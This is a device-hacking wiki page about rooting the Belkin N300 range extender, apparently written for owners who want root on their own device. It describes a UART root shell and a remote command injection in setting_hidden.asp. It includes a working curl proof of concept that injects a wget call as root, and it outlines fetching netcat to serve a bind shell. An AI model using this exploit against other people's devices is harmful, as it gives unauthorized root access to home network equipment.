

# Belkin N300

From Exploitee.rs

[Jump to navigation](#column-one)[Jump to search](#searchInput)

"*Although the information we release has been verified and shown to work to the best our knowledge, we cant be held accountable for bricked devices or roots gone wrong.*"

[![BELKIN N300.JPG](/images/3/36/BELKIN_N300.JPG)](/index.php/File%3ABELKIN_N300.JPG)
## Contents

* [1 Belkin N300](#Belkin_N300)
  + [1.1 Purchase](#Purchase)
    - [1.1.1 UART](#UART)
  + [1.2 Remote Root](#Remote_Root)
    - [1.2.1 POC](#POC)
    - [1.2.2 Demo](#Demo)
# Belkin N300

The Belkin N300 is a Wi-Fi Range Extender which runs a linux kernel on the RTL8196E chipset.

"With the Belkin Wi-Fi Range Extender, you can expand your home network's wireless connection up to an additional 5,000 square feet. It's incredibly simple to install and is compatible with virtually any router, so there's no need to reconfigure anything on your home wireless network. It's the fast, easy way to expand your home wireless connection."

## Purchase

Buying devices is expensive and, in a lot of cases our testing leads to bricked equipment. If you would like to help support our group, site, and research please use one of the links below to purchase your next device.
[Purchase the Belkin N300 is a Wi-Fi Range Extender at Amazon](https://www.amazon.com/Belkin-Wall-Mount-Extender-Simple-F9K1015/dp/B00K6HKJKI/ref%3Das_li_ss_tl?s=electronics&ie=UTF8&qid=1501936201&sr=1-1&keywords=Belkin+N300+range&linkCode=ll1&tag=exploiteers-20&linkId=5892985345b38c15d229889288c2982c)

### UART

Hardware root:
The UART interface, at 38400 buad, will drop to a root shell after the device completes booting.

[![BELKIN N300 UART.JPG](/images/2/2d/BELKIN_N300_UART.JPG)](/index.php/File%3ABELKIN_N300_UART.JPG)

## Remote Root

Remote root:
The script located at /setting\_hidden.asp, which is accessible before and after configuring the device, exhibits multiple remote command injection vulnerabilities. The following parameters in the [form name] form; [list vulnerable parameters], are not properly sanitized after being submitted to the web interface in a POST request. With specially crafted parameters, it is possible to inject a an OS command which will be executed with root privileges, as the web interface, and all processes on the device, run as root.

Caveats:
The device comes with a limited set of binaries, as well as a notably limited busybox binary. Because of this, the number of commands that can be executed via the command injection is limited. Initially achieving a remote shell is accomplished by executing a wget command to connect to a remote host and download a cross compiled netcat binary, then executed to serve /bin/sh on a given port. Once this is accomplished, a user can connect to the bind shell and have full access to their device.

### POC

Working as of Firmware 1.00.08

The following curl command is a Proof of Concept which demonstrates injecting an OS command as root.

```
curl -i -s -k  -X 'POST' -H 'Referer: http://192.168.206.1/setting_hidden.asp'\
 -H 'Content-Type: application/x-www-form-urlencoded'\
 --data-binary $'location_page=setting_hidden.asp&arc_action=vl_wizard_sel_ap&wl_ssid=">/dev/null;wget 10.0.0.1; echo "AAAA&wl_ssidforfile=BBBB&wl_seckey=CCCC&wl_seckeyforfile=DDDD&action=SetPassWord&formHiddenSSID=formHiddenSSIDpage&submit-url-ok=setting_checkpassword.asp&hidden_sectype=020&wl_rssi=ZXZX&wl_ssid_field=EEEE&key=FFFF&sec=wpa2a&bHiddenAP=1'\
 'http://192.168.206.1/goform/formBSSetSitesurvey'
```
### Demo

Retrieved from "[http://www.Exploitee.rs/index.php?title=Belkin\_N300&oldid=2881](https://www.Exploitee.rs/index.php?title=Belkin_N300&oldid=2881)"
[Category](/index.php/Special%3ACategories "Special:Categories"):

* [Networking](/index.php?title=Category:Networking&action=edit&redlink=1 "Category:Networking (page does not exist)")

## Navigation menu

### Page actions

* [Page](/index.php/Belkin_N300 "View the content page [c]")
* [Discussion](/index.php?title=Talk:Belkin_N300&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")
* [View](/index.php/Belkin_N300)
* [View source](/index.php?title=Belkin_N300&action=edit "This page is protected.
  You can view its source [e]")
* [History](/index.php?title=Belkin_N300&action=history "Past revisions of this page [h]")

### Page actions

* [Page](/index.php/Belkin_N300 "Page")
* [Discussion](/index.php?title=Talk:Belkin_N300&action=edit&redlink=1 " (page does not exist)")
* [More](#p-cactions)
* [Tools](#p-tb "Tools")

### Personal tools

* [Create account](/index.php?title=Special:CreateAccount&returnto=Belkin+N300 "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/index.php?title=Special:UserLogin&returnto=Belkin+N300 "You are encouraged to log in; however, it is not mandatory [o]")

### Navigation

* [Main page](/index.php/Main_Page "Visit the main page [z]")
* [Recent changes](/index.php/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Community Members](//Exploitee.rs/index.php/GTV_Hacker%3AAbout)
* [Random page](/index.php/Special%3ARandom "Load a random page [x]")
* [Help](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Help%3AContents "The place to find out")

### Search

### LINKS

* [Exploitee.rs Online Store](//shop.Exploitee.rs)
* [Exploitee.rs Forum](//forum.Exploitee.rs)
* [Exploitee.rs Blog](//blog.Exploitee.rs)
* [Exploitee.rs Twitter](//twitter.com/Exploiteers)
* [Exploitee.rs Discord Chat](//discord.gg/uJ77fQT)

### Tools

* [What links here](/index.php/Special%3AWhatLinksHere/Belkin_N300 "A list of all wiki pages that link here [j]")
* [Related changes](/index.php/Special%3ARecentChangesLinked/Belkin_N300 "Recent changes in pages linked from this page [k]")
* [Special pages](/index.php/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=Belkin_N300&oldid=2881 "Permanent link to this revision of the page")
* [Page information](/index.php?title=Belkin_N300&action=info "More information about this page")

[![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)

* This page was last edited on 10 August 2017, at 12:21.
* [Privacy policy](/index.php/Exploitee.rs%3APrivacy_policy "Exploitee.rs:Privacy policy")
* [About Exploitee.rs](/index.php/Exploitee.rs%3AAbout "Exploitee.rs:About")
* [Disclaimers](/index.php/Exploitee.rs%3AGeneral_disclaimer "Exploitee.rs:General disclaimer")

